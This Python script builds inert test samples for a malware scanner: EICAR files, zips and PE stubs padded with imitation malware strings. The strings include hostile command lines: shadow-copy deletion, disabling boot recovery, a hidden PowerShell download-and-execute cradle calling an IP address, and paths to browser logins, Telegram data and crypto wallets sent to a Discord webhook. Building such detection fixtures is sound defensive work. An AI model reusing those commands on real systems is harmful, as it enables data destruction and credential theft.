#!/usr/bin/env python3
"""Build HARMLESS test samples in ./samples (gitignored) to try Scanything end to end.

None of these files does anything when run: the PE stubs are a single `ret` instruction plus
strings that imitate what real malware contains, and EICAR is the standard antivirus test file.

    python scripts/make-test-samples.py
    scanything samples/eicar.zip
"""
from __future__ import annotations

import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from tests.fixtures import make_pe, make_zip  # noqa: E402

# Assembled at runtime so this source file itself is never flagged by antivirus.
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*").encode()

RANSOM = (b"\x00cmd.exe /c vssadmin delete shadows /all /quiet\x00bcdedit /set {default} recoveryenabled no\x00"
          b"YOUR FILES HAVE BEEN ENCRYPTED! Pay 0.1 bitcoin to get the decryption key.\x00"
          b"\x00http://185.244.25.11/gate.php\x00")
STEALER = (b"\x00powershell -w hidden -nop -c iex (New-Object Net.WebClient).DownloadString('http://45.13.22.9/a')\x00"
           b"\\Google\\Chrome\\User Data\\Default\\Login Data\x00\\Telegram Desktop\\tdata\x00wallet.dat\x00"
           b"https://discord.com/api/webhooks/1122334455/AbCdEf\x00"
           b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00vboxservice.exe\x00")
SIGNED_CERT = (b"\x00" * 8 + b"\x06\x03\x55\x04\x03\x0c\x15Example Software Ltd." +
               b"\x06\x03\x55\x04\x03\x13\x1aExample Code Signing CA G2")


def build(out: Path) -> list[tuple[str, str]]:
    made = []

    def write(name: str, data: bytes, expect: str):
        (out / name).write_bytes(data)
        made.append((name, expect))

    write("eicar.com", EICAR, "EICAR test file: AVs flag it, it is harmless (perfect false-positive demo)")
    write("eicar.zip", make_zip({"eicar.com": EICAR}), "same, inside a zip")
    write("ransomware_lookalike.zip",
          make_zip({"Invoice_2026.pdf.exe": make_pe(strings=RANSOM), "readme.txt": b"open the invoice"}),
          "decoy double extension + shadow-copy deletion + ransom note -> MALICIOUS")
    write("stealer_lookalike.exe", make_pe(strings=STEALER),
          "PowerShell cradle + browser/Telegram/wallet paths + Discord webhook -> MALICIOUS")
    write("signed_tool.zip",
          make_zip({"tool.exe": make_pe(strings=b"\x00Usage: tool [options] <file>\x00", cert=SIGNED_CERT),
                    "LICENSE.txt": b"MIT License\n" * 10}),
          "signed, no suspicious strings -> CLEAN / no indicators")
    write("upx_packed_tool.exe",
          make_pe(sections=[("UPX0", b"\x00" * 64, 0xE0000080), ("UPX1", bytes(range(256)) * 128, 0xE0000040)],
                  strings=b""),
          "UPX-packed, unsigned, nothing else -> typical generic-detection FALSE POSITIVE")
    if shutil.which("zip"):
        tmp = out / ".tmp"
        tmp.mkdir(exist_ok=True)
        (tmp / "Invoice_2026.pdf.exe").write_bytes(make_pe(strings=RANSOM))
        subprocess.run(["zip", "-q", "-P", "infected", str(out / "encrypted_infected.zip"),
                        "Invoice_2026.pdf.exe"], cwd=tmp, check=True)
        shutil.rmtree(tmp)
        made.append(("encrypted_infected.zip", "password 'infected' + hidden exe -> auto-unlocked and flagged"))
    return made


def main() -> int:
    out = ROOT / "samples"
    out.mkdir(exist_ok=True)
    for name, expect in build(out):
        print(f"  samples/{name:<26} {expect}")
    print("\nTry: scanything samples/eicar.zip --no-chat")
    return 0


if __name__ == "__main__":
    sys.exit(main())
